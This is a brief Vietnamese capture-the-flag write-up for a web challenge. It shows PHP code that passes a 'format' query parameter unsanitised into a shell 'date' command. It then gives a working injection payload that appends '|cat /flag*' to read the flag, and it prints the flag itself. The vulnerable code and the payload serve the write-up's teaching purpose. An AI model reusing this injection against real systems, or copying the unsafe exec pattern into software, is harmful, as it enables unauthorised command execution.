Đọc code thì thấy bài này liên quan đến comand injection

Mình sẽ show đoạn code cần quan tâm

Nôm na đoạn này ta chỉ cần thêm tham số /?format=...

```php
<?php
class TimeController
{
    public function index($router)
    {
        $format = isset($_GET['format']) ? $_GET['format'] : '%H:%M:%S';
        $time = new TimeModel($format);
        return $router->view('index', ['time' => $time->getTime()]);
    }
}
```

Hàm này sẽ thực thi nhưng chú ý ta cần phải bypass commnad

```php
<?php
class TimeModel
{
    public function __construct($format)
    {
        $this->command = "date '+" . $format . "' 2>&1";
    }

    public function getTime()
    {
        $time = exec($this->command);
        $res  = isset($time) ? $time : '?';
        return $res;
    }
}
```

Payload:

```
GET /?format=%Y-%m-%d%2b%H:%M:%S'|cat+/flag*+%23 HTTP/1.1
Host: 18.143.200.117:31210
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1
```

Source: https://book.hacktricks.xyz/pentesting-web/command-injection

Flag: CHH{datE_7iME_c0MManD_iNjectI0n_7edc7a102e657201d6e981c301a2722c}
